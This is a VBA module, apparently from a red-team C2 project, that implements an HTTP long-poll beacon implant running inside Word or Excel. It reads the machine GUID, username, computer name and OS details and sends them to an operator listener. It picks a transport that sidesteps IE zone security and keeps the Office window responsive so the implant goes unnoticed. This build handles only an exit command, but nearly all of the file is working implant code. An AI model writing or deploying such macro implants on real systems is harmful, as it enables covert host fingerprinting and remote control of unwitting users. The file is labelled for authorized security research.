Attribute VB_Name = "C2Agent"
Option Explicit

' ============================================================================
' vba-agent -- the VBA HTTP-beacon agent for the C2 platform.
'
' https://github.com/nostdlib/vba-agent
'
' A standard VBA module that turns its host process (WINWORD.EXE, EXCEL.EXE,
' any Office VBA host) into an implant -- the Office-macro sibling of the
' JScript / PowerShell / Python agents. Same identity model, same v3 beacon
' wire:
'
'   POST the beacon URL -- identity headers + the reply-frame body in,
'   a held 25-35 s answer with the queued command frames out.
'
' The module defines exactly ONE public symbol, RunAgent(); everything else
' is Private. It carries NO baked configuration: the single input is the
' process environment variable H_URL, which the host master sets before
' calling RunAgent.
'
' The beacon transport is ASYNC with a DoEvents pump (BeaconCycle): the
' long-poll hold IS the agent's only idle sleep, and blocking the host's
' one thread for 25-35 s per cycle would freeze the Office window into
' "not responding" -- the pump keeps the host's message loop alive. This is
' the same restructure the JScript agent makes for mshta's windowed host.
'
' Capability mask 0000000000000000: this breed ships no upgrade arm and no
' shell/filesystem categories. Exit (0x0A) is a core command and needs no
' bit. Every other opcode is answered with status 2 -- never silence.
'
' Authorized red-team use and security research only -- see
' RESPONSIBLE_USE.md.
' ============================================================================

' The one native call: the pump parks between readyState peeks. Everything
' else is late-bound COM (CreateObject / GetObject) -- no other declares, no
' typelib references.
#If VBA7 Then
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal ms As Long)
#Else
Private Declare Sub Sleep Lib "kernel32" (ByVal ms As Long)
#End If

' -- module state -------------------------------------------------------------
Private mBeaconUrl As String       ' H_URL -- the bare listener origin
Private mHdrNames() As String      ' identity headers, name/value pairs
Private mHdrValues() As String
Private mHdrCount As Long
Private mExiting As Boolean        ' 0x0A seen -- unwind
Private mIdleLogged As Boolean     ' the idle log is transition-only
Private mRunning As Boolean        ' re-entrancy guard (DoEvents makes re-entry reachable)
Private mLogShips As Collection    ' in-flight async log ships, retained until reaped
Private mReplies As Collection     ' reply frames owed since the last POST

' ============================================================================
' RunAgent -- the one public symbol. The host master sets H_URL in the
' process environment, then calls this.
'
'   set H_URL=http://host:port
'   ... CreateObject / dot sourcing the module ...
'   result = RunAgent()
'
' Returns one of:
'   "exit" -- the C2 sent 0x0A; the run ended cleanly (no reply is sent for
'             an Exit).
'   "fail" -- the beacon failed (no H_URL, transport dead, non-200 answer).
'             Failure is FATAL: one cycle, no retry -- the caller decides
'             what a dead beacon means. Identical to the siblings.
'   "busy" -- RunAgent was re-entered while a loop is already running (the
'             DoEvents pump makes re-entry reachable: a host firing another
'             macro lands here instead of a second beacon loop).
' ============================================================================
Public Function RunAgent() As String
    If mRunning Then RunAgent = "busy": Exit Function
    mRunning = True
    On Error GoTo fail
    mExiting = False
    mIdleLogged = False
    Set mLogShips = New Collection
    Set mReplies = New Collection

    ' No H_URL -> nothing to dial. The log is inert before identity exists,
    ' so this fails SILENTLY -- exactly how the siblings behave.
    mBeaconUrl = Environ$("H_URL")
    If Len(mBeaconUrl) = 0 Then
        RunAgent = "fail"
        GoTo done
    End If

    BuildIdentity
    Dim who As String
    who = HeaderVal("X-Device-Id")
    If Len(who) = 0 Then who = "an unidentified machine"
    LogLine "vba agent beaconing to " & mBeaconUrl & " as " & who

    ' The main loop. The hold inside BeaconCycle IS the idle sleep.
    Do
        Dim outcome As String
        outcome = BeaconCycle()
        If outcome <> "continue" Then
            RunAgent = outcome
            GoTo done
        End If
    Loop
fail:
    RunAgent = "fail"
done:
    mRunning = False
End Function

' ============================================================================
' BeaconCycle -- one POST round trip: reply frames in the body, a held
' answer out, its command frames dispatched. Returns "continue" / "exit" /
' "fail".
'
' Transport: MSXML2.ServerXMLHTTP (WinHTTP-backed -- ignores IE URL-zone
' security, which plain XMLHTTP does not; the same reason the C2's dotm
' template picks it). Timeouts resolve/connect/send/receive =
' 10/10/15/45 s. Sent async + pumped: DoEvents every 50 ms so the host UI
' stays alive through the 25-35 s hold, with a 90 s wrap-safe deadline.
'
' The empty answer (Content-Length 0 / absent) means nothing queued --
' re-POST immediately. Failure is fatal for the run.
' ============================================================================
Private Function BeaconCycle() As String
    ReapLogShips

    Dim x As Object
    Set x = MakeTransport(10000, 10000, 15000, 45000, True)
    If x Is Nothing Then BeaconCycle = "fail": Exit Function
    ApplyHeaders x

    On Error GoTo failed
    ' The reply frames owed since the last POST go out in this body; an
    ' empty body is a plain idle beacon (zero frames on the wire).
    If mReplies.Count > 0 Then
        x.Send ConcatFrames(mReplies)
    Else
        x.Send ""
    End If

    ' The hold IS the idle sleep: pump the host's message loop while the
    ' answer is in flight. The setTimeouts phases already bound the request
    ' (10+10+15+45 s worst case); the 90 s deadline only bounds the pump.
    Dim t0 As Single
    t0 = Timer
    Do While x.readyState <> 4
        DoEvents
        If Elapsed(t0) > 90 Then
            x.abort
            BeaconCycle = "fail"
            Exit Function
        End If
        Sleep 50
    Loop

    Dim status As Long
    status = x.Status
    If status <> 200 Then
        LogLine "http " & status
        BeaconCycle = "fail"
        Exit Function
    End If

    ' The batch is claimed -- anything minted from here on rides the NEXT
    ' post.
    mReplies.Clear

    ' Gate on Content-Length, never on the body: getResponseHeader RAISES
    ' when the header is absent, so the read sits under resume-next and an
    ' absent header reads as "nothing queued". The body is not touched
    ' until the header proves frames are waiting.
    Dim contentLength As Long
    On Error Resume Next
    contentLength = CLng(x.getResponseHeader("Content-Length"))
    On Error GoTo failed
    If contentLength <= 0 Then
        ' Idle. The log ships once per idle ENTRY, not once per cycle.
        If Not mIdleLogged Then
            LogLine "idle - empty answer"
            mIdleLogged = True
        End If
        BeaconCycle = "continue"
        Exit Function
    End If
    mIdleLogged = False

    ' responseBody is a native Byte() safearray -- no ADODB stream / codepage
    ' bridge needed (unlike JScript, VBA has real bytes).
    Dim body() As Byte
    body = x.responseBody
    If BytesLen(body) = 0 Then
        BeaconCycle = "continue"
        Exit Function
    End If
    ParseAndDispatch body

    If mExiting Then
        LogLine "exit"
        BeaconCycle = "exit"
        Exit Function
    End If
    BeaconCycle = "continue"
    Exit Function
failed:
    BeaconCycle = "fail"
End Function

' ============================================================================
' LogLine -- log() = C2 ship ONLY. Zero local echo (no MsgBox, no
' Debug.Print): every line is POSTed with X-Log-Only: 1, and the C2 answers
' an immediate empty 200 (no long-poll hold).
'
' Ships are ASYNC and fire-and-forget: each keeps its transport alive in
' mLogShips (a released MSXML object aborts its own in-flight send) until a
' per-cycle reap drops the finished ones. The cap bounds a chatty command
' to 3 open sockets. A failed ship is swallowed in silence -- never fatal.
' Keep calls at milestone granularity, never inside tight loops.
' ============================================================================
Private Sub LogLine(ByVal msg As String)
    If Len(mBeaconUrl) = 0 Or mHdrCount = 0 Then Exit Sub
    ReapLogShips
    If mLogShips.Count >= 3 Then Exit Sub

    Dim x As Object
    Set x = MakeTransport(10000, 10000, 15000, 15000, True)
    If x Is Nothing Then Exit Sub
    ApplyHeaders x
    On Error GoTo done
    x.setRequestHeader "X-Log-Only", "1"
    x.Send FrameBytes(StringBytes(msg))
    mLogShips.Add x
done:
End Sub

' Drop finished (or dead) log ships -- reaped per beacon cycle and per ship.
Private Sub ReapLogShips()
    If mLogShips Is Nothing Then Exit Sub
    Dim i As Long, st As Long, dead As Boolean
    For i = mLogShips.Count To 1 Step -1
        dead = False
        On Error Resume Next
        st = 0
        st = mLogShips(i).readyState
        If Err.Number <> 0 Then dead = True
        On Error GoTo 0
        If dead Or st = 4 Then mLogShips.Remove i
    Next
End Sub

' MSXML2.ServerXMLHTTP, POST to the beacon URL, timeouts applied AFTER Open
' (the ordering the verified WinHttpRequest transport uses). Returns
' Nothing when the progid fails to create.
Private Function MakeTransport(ByVal tResolve As Long, ByVal tConnect As Long, _
    ByVal tSend As Long, ByVal tReceive As Long, ByVal asyncMode As Boolean) As Object

    On Error Resume Next
    Dim x As Object
    Set x = CreateObject("MSXML2.ServerXMLHTTP")
    On Error GoTo 0
    If x Is Nothing Then Exit Function
    x.Open "POST", mBeaconUrl, asyncMode
    x.setTimeouts tResolve, tConnect, tSend, tReceive
    Set MakeTransport = x
End Function

' Identity headers ride EVERY post (beacon and log ship alike).
Private Sub ApplyHeaders(ByVal x As Object)
    Dim i As Long
    On Error Resume Next
    For i = 1 To mHdrCount
        x.setRequestHeader mHdrNames(i), mHdrValues(i)
    Next
    On Error GoTo 0
End Sub

' Header add with the omit-empty policy enforced at the single choke point:
' a value that could not be detected OMITS the header, so the C2 sees "not
' reported" instead of an empty string or a fabricated default.
Private Sub AddHeader(ByVal hdrName As String, ByVal hdrValue As String)
    If Len(hdrValue) = 0 Then Exit Sub
    mHdrCount = mHdrCount + 1
    ReDim Preserve mHdrNames(1 To mHdrCount)
    ReDim Preserve mHdrValues(1 To mHdrCount)
    mHdrNames(mHdrCount) = hdrName
    mHdrValues(mHdrCount) = hdrValue
End Sub

Private Function HeaderVal(ByVal hdrName As String) As String
    Dim i As Long
    For i = 1 To mHdrCount
        If mHdrNames(i) = hdrName Then HeaderVal = mHdrValues(i): Exit Function
    Next
End Function

' ============================================================================
' BuildIdentity -- the header set, once per run. Session-static identity
' (the siblings derive the same set; API version 1):
'
'   REQUIRED (compile-time constants):
'     X-Api-Version      1
'     X-Platform         Windows
'     X-Client-Id        6    (breed: VBA agent)
'     X-Client-Features  0000000000000000  (no optional categories -- v1)
'
'   OPTIONAL (detection-derived; omitted when undetected):
'     X-Device-Id    MachineGuid, canonical x86 view (see MachineUuid)
'     X-Session-Id   random per-run key (see SessionKey)
'     X-Device-Name  COMPUTERNAME
'     X-User-Id      USERNAME
'     X-Device-Arch  OS arch, X-App-Arch  process arch
'     X-OS-Version   X-OS-Build           (WMI Win32_OperatingSystem)
'
' There is NO bitness header: X-App-Arch already carries the process width.
' ============================================================================
Private Sub BuildIdentity()
    mHdrCount = 0
    AddHeader "X-Api-Version", "1"
    AddHeader "X-Platform", "Windows"
    AddHeader "X-Client-Id", "6"
    AddHeader "X-Client-Features", "0000000000000000"

    AddHeader "X-Device-Id", MachineUuid()
    AddHeader "X-Session-Id", SessionKey()
    AddHeader "X-Device-Name", Environ$("COMPUTERNAME")
    AddHeader "X-User-Id", Environ$("USERNAME")

    ' OS arch: PROCESSOR_ARCHITEW6432 (a 32-bit process on a 64-bit OS)
    ' wins over PROCESSOR_ARCHITECTURE; the WMI Win32_Processor code
    ' overrides both when readable (0 = i386, 9 = x86_64, 12 = aarch64).
    ' The process arch is the env of THIS process.
    Dim osArch As String, procArch As String
    osArch = MapArch(EnvFirst("PROCESSOR_ARCHITEW6432", "PROCESSOR_ARCHITECTURE"))
    procArch = MapArch(Environ$("PROCESSOR_ARCHITECTURE"))

    Dim osVersion As String, buildNumber As String, cpuCode As String
    Dim wmi As Object, item As Object
    Set wmi = WmiRoot()
    If Not wmi Is Nothing Then
        On Error Resume Next
        For Each item In wmi.ExecQuery("SELECT Version, BuildNumber FROM Win32_OperatingSystem")
            osVersion = UnNull(item.Version)
            buildNumber = UnNull(item.BuildNumber)
        Next
        For Each item In wmi.ExecQuery("SELECT Architecture FROM Win32_Processor")
            cpuCode = UnNull(item.Architecture)
        Next
        On Error GoTo 0
    End If
    Select Case cpuCode
        Case "0": osArch = "i386"
        Case "9": osArch = "x86_64"
        Case "12": osArch = "aarch64"
    End Select
    AddHeader "X-Device-Arch", osArch
    AddHeader "X-App-Arch", procArch
    AddHeader "X-OS-Version", osVersion
    AddHeader "X-OS-Build", buildNumber
End Sub

' ============================================================================
' MachineUuid -- the stable device id, the canonical x86-view MachineGuid
' (the exact chain the sibling breeds run; every breed must derive the SAME
' id or one machine mints two agent rows):
'
'   1. StdRegProv GetStringValue of MachineGuid. StdRegProv serves the
'      NATIVE registry view regardless of caller bitness, so the canonical
'      x86-view copy is read through its EXPLICIT Wow6432Node path on a
'      64-bit OS (a 32-bit host's redirected default view IS that copy).
'      On 32-bit OSes the default path is the only view.
'   2. Default view (the ARM64 edge where nothing keys the x86-view copy).
'   3. WScript.Shell RegRead (registry REDIRECTION applies to this caller,
'      so a 32-bit host's default view is again the canonical copy).
'   4. SMBIOS Win32_ComputerSystemProduct.UUID -- stable across OS
'      reinstalls; the all-zero UUID is REJECTED (bare-metal defaults).
'   5. "" -- the header is OMITTED and the C2 fills its derived-uuid
'      fallback. NEVER a zero GUID: all zeros is a valid-SHAPED value that
'      would key ONE shared phantom row for every machine where detection
'      failed.
' ============================================================================
Private Function MachineUuid() As String
    Dim subKey As String
    If OsIs64Bit() Then
        subKey = "SOFTWARE\Wow6432Node\Microsoft\Cryptography\MachineGuid"
    Else
        subKey = "SOFTWARE\Microsoft\Cryptography\MachineGuid"
    End If

    Dim reg As Object, v As Variant, candidate As String
    On Error Resume Next
    Set reg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    If Not reg Is Nothing Then
        reg.GetStringValue &H80000002, subKey, "MachineGuid", v
        candidate = LCase$(Trim$(UnNull(v)))
        If LooksLikeGuid(candidate) Then
            MachineUuid = candidate
            GoTo finished
        End If
        If OsIs64Bit() Then
            ' The explicit x86-view copy is missing -- the ARM64 edge where
            ' nothing keys on it. Fall back to the default view, the only
            ' copy that exists.
            v = Empty
            reg.GetStringValue &H80000002, "SOFTWARE\Microsoft\Cryptography\MachineGuid", "MachineGuid", v
            candidate = LCase$(Trim$(UnNull(v)))
            If LooksLikeGuid(candidate) Then
                MachineUuid = candidate
                GoTo finished
            End If
        End If
    End If

    ' WMI dead entirely -- WScript.Shell RegRead.
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    candidate = LCase$(Trim$(UnNull(sh.RegRead("HKLM\" & subKey & "\MachineGuid"))))
    If LooksLikeGuid(candidate) Then
        MachineUuid = candidate
        GoTo finished
    End If

    ' SMBIOS hardware UUID fallback.
    Dim wmi As Object, item As Object
    Set wmi = WmiRoot()
    If Not wmi Is Nothing Then
        For Each item In wmi.ExecQuery("SELECT UUID FROM Win32_ComputerSystemProduct")
            candidate = LCase$(Trim$(UnNull(item.UUID)))
            If LooksLikeGuid(candidate) And _
                candidate <> "00000000-0000-0000-0000-000000000000" Then
                MachineUuid = candidate
                Exit For
            End If
        Next
    End If
finished:
    On Error GoTo 0
    ' Every source failed: "" -- the header is omitted (see above).
    If Not LooksLikeGuid(MachineUuid) Then MachineUuid = ""
End Function

' ============================================================================
' SessionKey -- a random key identifying THIS run (never a hardware value):
' a Scriptlet.TypeLib GUID, or a Rnd-built hex string of the same shape when
' that progid is blocked. Uniqueness is all the key needs; it identifies a
' runtime, it authorizes nothing.
' ============================================================================
Private Function SessionKey() As String
    On Error Resume Next
    Dim g As String
    ' The GUID property ships brace-wrapped and often CR/LF-terminated --
    ' Trim$ alone does not strip CR/LF, so both are cut explicitly.
    g = CreateObject("Scriptlet.TypeLib").GUID & ""
    g = Replace(Replace(LCase$(g), "{", ""), "}", "")
    g = Replace(Replace(g, vbCr, ""), vbLf, "")
    g = Trim$(g)
    If LooksLikeGuid(g) Then SessionKey = g: Exit Function

    Dim hexc As String, k As String, i As Long
    Randomize
    hexc = "0123456789abcdef"
    For i = 1 To 36
        Select Case i
            Case 9, 14, 19, 24
                k = k & "-"
            Case Else
                k = k & Mid$(hexc, Int(Rnd * 16#) + 1, 1)
        End Select
    Next
    SessionKey = k
End Function

' ============================================================================
' ParseAndDispatch -- walk the answer body: repeated [u32le len][bytes]
' frames, dispatched in order. Trailing garbage or a corrupt length stops
' the walk (frames before the corruption were already dispatched). An
' empty body never reaches here.
' ============================================================================
Private Sub ParseAndDispatch(body() As Byte)
    Dim total As Long, p As Long, flen As Long, j As Long
    Dim frame() As Byte
    total = BytesLen(body)
    p = 0
    Do While p + 4 <= total
        ' A frame longer than 64 MiB is corruption -- reject before the
        ' length math: the top byte of a legal length never exceeds &H3F,
        ' and Byte * &H1000000 overflows Integer math if not forced Long.
        If body(p + 3) > &H3F& Then Exit Do
        flen = CLng(body(p)) _
            Or CLng(body(p + 1)) * &H100& _
            Or CLng(body(p + 2)) * &H10000 _
            Or CLng(body(p + 3)) * &H1000000
        p = p + 4
        If flen <= 0 Or p + flen > total Then Exit Do
        ReDim frame(0 To flen - 1)
        For j = 0 To flen - 1
            frame(j) = body(p + j)
        Next
        p = p + flen
        If Not mExiting Then Dispatch frame
    Loop
End Sub

' ============================================================================
' Dispatch -- one command frame: [opcode][corrId:u32le][payload...]. Every
' reply echoes the id verbatim after its status:
' [status:u32le][corrId:u32le] -- id 0 = unmatched. The corrId is copied as
' RAW BYTES, no integer math anywhere near it: a u32 can exceed VBA's Long
' and any round trip through a number would corrupt the id the C2 claims
' the reply by.
'
'   0x0A  Exit  -- set the flag, reply NOTHING, unwind the loop.
'   other       -- status 2 (unsupported). This breed advertises an all-
'                  zero capability mask, so the C2 never queues more.
' ============================================================================
Private Sub Dispatch(frame() As Byte)
    Dim corr(0 To 3) As Byte
    Dim j As Long, n As Long, status As Long
    n = BytesLen(frame)
    If n >= 5 Then
        For j = 0 To 3
            corr(j) = frame(1 + j)
        Next
    End If

    Select Case frame(0)
        Case &HA
            mExiting = True
            Exit Sub
        Case Else
            LogLine "command opcode " & frame(0) & " unknown - replying status 2"
            status = 2
    End Select

    Dim r() As Byte
    ReDim r(0 To 7)
    PutU32 r, 0, status
    r(4) = corr(0): r(5) = corr(1): r(6) = corr(2): r(7) = corr(3)
    mReplies.Add r
End Sub

' u32 LE writer with pure Long math (integer division, no overflow).
Private Sub PutU32(out() As Byte, ByVal off As Long, ByVal v As Long)
    out(off) = v And &HFF&
    out(off + 1) = (v \ &H100&) And &HFF&
    out(off + 2) = (v \ &H10000) And &HFF&
    out(off + 3) = (v \ &H1000000) And &HFF&
End Sub

' Join reply frames back-to-back into one body.
Private Function ConcatFrames(col As Collection) As Byte()
    Dim total As Long, n As Long, p As Long, j As Long
    Dim b As Variant
    For Each b In col
        total = total + 4 + BytesLen(b)
    Next
    If total = 0 Then Exit Function
    Dim out() As Byte
    ReDim out(0 To total - 1)
    p = 0
    For Each b In col
        n = BytesLen(b)
        PutU32 out, p, n
        p = p + 4
        For j = 0 To n - 1
            out(p) = b(j)
            p = p + 1
        Next
    Next
    ConcatFrames = out
End Function

' Frame one log line: [u32le len][utf8-ish bytes].
Private Function FrameBytes(body() As Byte) As Byte()
    Dim n As Long, i As Long
    Dim out() As Byte
    n = BytesLen(body)
    If n = 0 Then Exit Function
    ReDim out(0 To 3 + n - 1)
    PutU32 out, 0, n
    For i = 0 To n - 1
        out(4 + i) = body(i)
    Next
    FrameBytes = out
End Function

' String to bytes, UTF-8-ish like the siblings: chars masked to a byte.
Private Function StringBytes(ByVal s As String) As Byte()
    Dim n As Long, i As Long
    Dim b() As Byte
    n = Len(s)
    If n = 0 Then Exit Function
    ReDim b(0 To n - 1)
    For i = 1 To n
        b(i - 1) = AscW(Mid$(s, i, 1)) And &HFF&
    Next
    StringBytes = b
End Function

' Element count of a byte array; an unallocated array is zero.
Private Function BytesLen(ByRef b As Variant) As Long
    On Error Resume Next
    BytesLen = UBound(b) + 1
End Function

' Env arch spelling -> the wire's arch token. An undetected value stays ""
' (the header is omitted -- never sent empty, never a placeholder).
Private Function MapArch(ByVal envVal As String) As String
    Select Case envVal
        Case "AMD64": MapArch = "x86_64"
        Case "x86": MapArch = "i386"
        Case "ARM64": MapArch = "aarch64"
        Case Else: MapArch = envVal
    End Select
End Function

Private Function EnvFirst(ByVal a As String, ByVal b As String) As String
    Dim v As String
    v = Environ$(a)
    If Len(v) = 0 Then v = Environ$(b)
    EnvFirst = v
End Function

' Null/Empty VARIANT -> "" (late-bound COM out params come back Null when
' the source failed).
Private Function UnNull(ByVal v As Variant) As String
    If IsNull(v) Then Exit Function
    If IsEmpty(v) Then Exit Function
    UnNull = CStr(v)
End Function

Private Function WmiRoot() As Object
    On Error Resume Next
    Set WmiRoot = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
End Function

' 36 chars, hyphens at 9/14/19/24, hex everywhere else -- the shape the C2
' accepts as a device id (a raw .NET Guid.ToString() render).
Private Function LooksLikeGuid(ByVal s As String) As Boolean
    Dim i As Long, c As String
    If Len(s) <> 36 Then Exit Function
    For i = 1 To 36
        c = Mid$(s, i, 1)
        If i = 9 Or i = 14 Or i = 19 Or i = 24 Then
            If c <> "-" Then Exit Function
        Else
            If InStr(1, "0123456789abcdef", c, vbTextCompare) = 0 Then Exit Function
        End If
    Next
    LooksLikeGuid = True
End Function

' 64-bit OS detection from the env: PROCESSOR_ARCHITEW6432 exists only for
' a 32-bit process on a 64-bit OS, otherwise PROCESSOR_ARCHITECTURE names
' the native arch (AMD64 / ARM64 / IA64 all contain "64").
Private Function OsIs64Bit() As Boolean
    OsIs64Bit = (InStr(1, EnvFirst("PROCESSOR_ARCHITEW6432", "PROCESSOR_ARCHITECTURE"), _
        "64", vbTextCompare) > 0)
End Function

' Seconds elapsed since t0, wrap-safe across Timer's midnight reset.
Private Function Elapsed(ByVal t0 As Single) As Single
    Dim t As Single
    t = Timer
    If t < t0 Then t = t + 86400!
    Elapsed = t - t0
End Function
